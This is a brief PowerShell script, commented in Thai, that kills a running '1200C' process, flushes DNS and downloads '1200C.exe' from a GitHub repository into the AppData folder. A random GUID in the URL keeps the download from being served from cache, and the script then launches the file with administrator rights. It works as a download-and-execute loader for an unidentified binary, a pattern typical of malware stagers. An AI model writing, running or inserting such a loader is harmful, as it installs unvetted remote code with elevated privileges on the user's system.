# 1. ปิดโปรแกรมเดิมที่อาจรันค้างอยู่ (เพื่อไม่ให้ไฟล์ติด Lock ขณะโหลดทับ)
Stop-Process -Name "1200C" -ErrorAction SilentlyContinue

# 2. กำหนด Path เก็บไฟล์ (เก็บที่ AppData)
$exePath = "$env:APPDATA\1200C.exe"

# 3. ล้าง DNS Cache เพื่อให้ชัวร์ว่าเชื่อมต่อ GitHub ได้ตัวล่าสุด
ipconfig /flushdns

# 4. ตั้งค่า URL (เปลี่ยนชื่อไฟล์ในลิ้งก์เป็น 1200C.exe และใช้ GUID เพื่อเลี่ยง Cache)
$url = "https://github.com/lubyralph6-maker/newpower.ps1/raw/main/1200C.exe?v=$([guid]::NewGuid())"

# 5. ดาวน์โหลดไฟล์ใหม่
try {
    Write-Host "Connecting to server and launching 1200C..." -ForegroundColor Cyan
    Invoke-WebRequest -Uri $url -OutFile $exePath -UseBasicParsing
} catch {
    Write-Host "Error: Cannot connect to server!" -ForegroundColor Red
    exit
}

# 6. รันโปรแกรมใหม่ทันที (รันในโหมด Admin)
if (Test-Path $exePath) {
    Write-Host "Launching..." -ForegroundColor Green
    Start-Process -FilePath $exePath -Verb RunAs
}
